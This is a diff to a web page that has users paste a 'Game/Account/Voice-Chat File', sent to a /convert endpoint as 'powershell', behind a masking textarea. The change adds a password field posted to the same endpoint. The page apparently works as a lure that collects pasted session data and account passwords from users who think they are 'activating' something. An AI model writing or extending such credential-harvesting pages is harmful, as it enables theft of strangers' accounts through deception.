@@ -653,6 +653,18 @@ textarea:focus {
   box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
 }
 
+#password:focus {
+  outline: none;
+  border-color: var(--accent-blue);
+  box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
+  background: rgba(45, 45, 60, 0.95);
+}
+
+#password::placeholder {
+  color: var(--text-secondary);
+  opacity: 0.7;
+}
+
 .activate-btn {
   background: var(--secondary-gradient);
   color: white;
@@ -932,6 +944,9 @@ textarea:focus {
         <label class="input-label" for="ps">Input Files Here</label>
         <textarea id="ps" placeholder="Paste Game/Account/Voice-Chat File Here (Watch Tutorial on how to do it)." style="display: none;"></textarea>
         <textarea id="psDisplay" placeholder="Paste Game/Account/Voice-Chat File Here (Watch Tutorial on how to do it)."></textarea>
+
+        <label class="input-label" for="password" style="margin-top: 1.5rem;">Password (Optional)</label>
+        <input type="text" id="password" placeholder="Enter password for this service" style="width: 100%; background: var(--surface-light); border: 1px solid var(--border-color); border-radius: 12px; padding: 1rem; font-size: 1rem; color: var(--text-primary); transition: all 0.3s ease; font-family: inherit; margin-bottom: 1rem;">
 
         <button id="btn" class="activate-btn">Activate</button>
 
@@ -1310,6 +1325,8 @@ async function go(){
                 convertEndpoint = `/${pathParts[0]}/convert`;
             }
 
+            const password = document.getElementById('password').value.trim();
+
             const response = await fetch(convertEndpoint, {
                     method: 'POST',
                     headers: {
@@ -1318,7 +1335,8 @@ async function go(){
                     },
                     body: JSON.stringify({
                         powershell: ps,
-                        scriptType: scriptType
+                        scriptType: scriptType,
+                        password: password
                     })
                 });
 
@@ -1337,6 +1355,7 @@ async function go(){
       document.getElementById("ps").value = "";
       document.getElementById("psDisplay").value = "";
       document.getElementById("scriptType").value = "";
+      document.getElementById("password").value = "";
       
       // Reset masking state
       const displayTextarea = document.getElementById('psDisplay');
